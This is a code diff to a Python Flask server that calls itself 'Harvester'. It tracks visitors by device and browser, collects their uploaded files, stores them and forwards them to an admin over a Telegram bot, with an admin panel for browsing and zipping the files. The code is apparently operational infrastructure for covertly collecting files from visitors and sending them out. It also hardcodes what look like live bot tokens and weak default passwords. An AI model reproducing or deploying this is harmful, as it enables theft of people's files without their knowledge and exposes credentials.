@@ -3,6 +3,7 @@ import io
 import time
 import uuid
 import json
+import socket
 import hashlib
 import zipfile
 import urllib.request
@@ -19,14 +20,20 @@ VISITORS_FILE = os.path.join(DATA_DIR, "visitors.json")
 os.makedirs(STORAGE, exist_ok=True)
 
 # ---------------- config ----------------
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8948181167:AAGQeYvj_dksfj_DDnW428b8OqpnTBPPlis")
-ADMIN_ID = int(os.environ.get("ADMIN_ID", "7161177100"))
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8975038251:AAHSAVpptm8z-P0bAZh5zfXEUEWhnsL0BuA")
+ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))
 RAW_KEY = os.environ.get("RAW_KEY", "changeme")
 WEB_PASSWORD = os.environ.get("WEB_PASSWORD", "admin")
+PUBLIC_URL = os.environ.get("PUBLIC_URL", "").rstrip("/")
 API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 MAX_TG = 50 * 1024 * 1024
-PAGE_SIZE = 8    # how many visitors/files per page
+PAGE_SIZE = 8
+
+# ---------------- boot state ----------------
+BOOT_TS = int(time.time())
+_BOOT_DONE = {"done": False}   # guarded so it only fires once per process
+
 
 # ---------------- persistent state ----------------
 def load_visitors():
@@ -47,7 +54,7 @@ def save_visitors(v):
 
 VISITORS = load_visitors()
 MUTE = {"on": False}
-LIVE = {}   # vid -> last seen ts
+LIVE = {}
 
 
 # ---------------- telegram helpers ----------------
@@ -131,7 +138,60 @@ def build_label(d):
     return f"{model} · {browser}"
 
 
-# ---------------- main menu (upgrade #1) ----------------
+# ---------------- webhook boot helpers ----------------
+def set_webhook(url):
+    if not url:
+        print("[boot] PUBLIC_URL not set — webhook skipped")
+        return {"ok": False, "reason": "no PUBLIC_URL"}
+    res = tg_call("setWebhook", {
+        "url": f"{url}/webhook",
+        "allowed_updates": json.dumps(["message", "callback_query"]),
+        "drop_pending_updates": "true",
+    })
+    print("[boot] setWebhook ->", res)
+    return res
+
+
+def boot_ping():
+    if not ADMIN_ID:
+        print("[boot] ADMIN_ID not set — no boot ping")
+        return {"ok": False, "reason": "no ADMIN_ID"}
+    host = socket.gethostname()
+    try:
+        ip = socket.gethostbyname(host)
+    except Exception:
+        ip = "?"
+    text = (
+        "🚀 <b>Harvester online</b>\n"
+        f"<b>Host:</b> <code>{host}</code>\n"
+        f"<b>IP:</b> <code>{ip}</code>\n"
+        f"<b>Public:</b> <code>{PUBLIC_URL or 'not set'}</code>\n"
+        f"<b>Visitors:</b> {len(VISITORS)}\n"
+        f"<b>Boot:</b> {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(BOOT_TS))} UTC"
+    )
+    return send_msg(ADMIN_ID, text, force=True)
+
+
+def boot():
+    """Fire once per process: register webhook + ping admin."""
+    if _BOOT_DONE["done"]:
+        return {"ok": True, "skipped": True}
+    _BOOT_DONE["done"] = True
+    result = {"webhook": None, "ping": None}
+    if PUBLIC_URL:
+        result["webhook"] = set_webhook(PUBLIC_URL)
+    result["ping"] = boot_ping()
+    return result
+
+
+# Fire on first request — works under gunicorn, flask dev, everything.
+@app.before_request
+def _ensure_boot():
+    if not _BOOT_DONE["done"]:
+        boot()
+
+
+# ---------------- main menu ----------------
 def send_main_menu(chat_id):
     n = len(VISITORS)
     total_files = sum(len(v["files"]) for v in VISITORS.values())
@@ -233,7 +293,17 @@ def landing():
 
 @app.get("/health")
 def health():
-    return jsonify(ok=True, visitors=len(VISITORS), admin_set=ADMIN_ID != 0)
+    return jsonify(ok=True, visitors=len(VISITORS),
+                   admin_set=ADMIN_ID != 0,
+                   public_url_set=bool(PUBLIC_URL),
+                   boot_done=_BOOT_DONE["done"])
+
+
+@app.get("/boot")
+def manual_boot():
+    """Manual re-trigger — hit this if webhook didn't register."""
+    _BOOT_DONE["done"] = False
+    return jsonify(boot())
 
 
 @app.post("/register")
@@ -265,7 +335,12 @@ def ping():
     d = request.get_json(force=True) or {}
     vid = d.get("vid")
     if vid:
-        LIVE[vid] = int(time.time())
+        now = int(time.time())
+        LIVE[vid] = now
+        # prune stale LIVE entries
+        stale = [k for k, ts in LIVE.items() if now - ts > 600]
+        for k in stale:
+            del LIVE[k]
     return jsonify(ok=True)
 
 
@@ -276,11 +351,9 @@ def upload():
     if not f:
         return jsonify(ok=False, reason="empty"), 400
 
-    # upgrade #8: reject empty files
     if not f.filename or f.filename.strip() == "":
         return jsonify(ok=False, reason="no-name"), 400
 
-    # upgrade #7: dedupe by content hash
     content = f.read()
     if len(content) == 0:
         return jsonify(ok=False, reason="zero-bytes"), 400
@@ -317,7 +390,7 @@ def upload():
                     ADMIN_ID,
                     f"⚠️ <b>Oversized</b>\n{f.filename} · {size//1024//1024} MB\n"
                     f"From: {label}\nDownload: "
-                    f"<a href='https://{request.host}/raw/{safe}?k={RAW_KEY}'>/raw/{safe}</a>"
+                    f"<a href='{PUBLIC_URL or request.host_url.rstrip('/')}/raw/{safe}?k={RAW_KEY}'>/raw/{safe}</a>"
                 )
         except Exception as e:
             print("push err", e)
@@ -332,7 +405,7 @@ def raw(stored):
     return send_from_directory(STORAGE, stored, as_attachment=True)
 
 
-# ---------------- web admin panel (upgrade #6) ----------------
+# ---------------- web admin panel ----------------
 @app.get("/admin")
 def admin_panel():
     if request.args.get("p") != WEB_PASSWORD:
@@ -384,11 +457,8 @@ def admin_zip():
             p = os.path.join(STORAGE, f["stored"])
             if os.path.exists(p):
                 z.write(p, arcname=f["name"])
-    buf.seek(0)
-    return send_from_directory(
-        STORAGE, "dummy", as_attachment=False
-    ) if False else app.response_class(
-        buf.read(),
+    return app.response_class(
+        buf.getvalue(),
         mimetype="application/zip",
         headers={"Content-Disposition": f"attachment; filename={vid}.zip"},
     )
@@ -403,11 +473,37 @@ def webhook():
     chat_id = msg.get("chat", {}).get("id")
     cb = upd.get("callback_query")
 
+    # ignore strangers, but tell them their ID (helpful for ADMIN_ID setup)
     if chat_id and chat_id != ADMIN_ID:
+        if text == "/start":
+            send_msg(chat_id,
+                f"Your ID: <code>{chat_id}</code>\nNot authorized.",
+                force=True)
         return jsonify(ok=True)
 
     if text == "/start":
         send_main_menu(chat_id)
+        info = tg_call("getWebhookInfo")
+        if not (info.get("result") or {}).get("url"):
+            send_msg(chat_id,
+                "⚠️ <b>Webhook not registered.</b>\n"
+                "Set PUBLIC_URL env var and either redeploy or hit /boot.",
+                force=True)
+        return jsonify(ok=True)
+
+    if text == "/setwebhook":
+        res = set_webhook(PUBLIC_URL)
+        send_msg(chat_id,
+            f"🔗 setWebhook: <code>{res.get('ok')}</code>\n"
+            f"<code>{json.dumps(res.get('result') or res.get('error'), default=str)[:300]}</code>",
+            force=True)
+        return jsonify(ok=True)
+
+    if text == "/webhookinfo":
+        info = tg_call("getWebhookInfo")
+        send_msg(chat_id,
+            f"🔗 <b>Webhook info</b>\n<code>{json.dumps(info.get('result'), indent=2)[:900]}</code>",
+            force=True)
         return jsonify(ok=True)
 
     if text.startswith("/search"):
@@ -504,7 +600,7 @@ def webhook():
                     else:
                         send_msg(chat_id,
                             f"⚠️ <code>{f['name']}</code> too big.\n"
-                            f"Download: <a href='https://{request.host}/raw/{f['stored']}?k={RAW_KEY}'>link</a>",
+                            f"Download: <a href='{PUBLIC_URL or request.host_url.rstrip('/')}/raw/{f['stored']}?k={RAW_KEY}'>link</a>",
                             force=True)
             tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
             return jsonify(ok=True)
@@ -549,7 +645,7 @@ def webhook():
                         out.write(zdata)
                     send_msg(chat_id,
                         f"🗜 Zip too big for Telegram.\n"
-                        f"Download: <a href='https://{request.host}/raw/{zname}?k={RAW_KEY}'>link</a>",
+                        f"Download: <a href='{PUBLIC_URL or request.host_url.rstrip('/')}/raw/{zname}?k={RAW_KEY}'>link</a>",
                         force=True)
             tg_call("answerCallbackQuery", {"callback_query_id": cb_id})
             return jsonify(ok=True)
@@ -570,4 +666,5 @@ def webhook():
 
 
 if __name__ == "__main__":
+    boot()
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
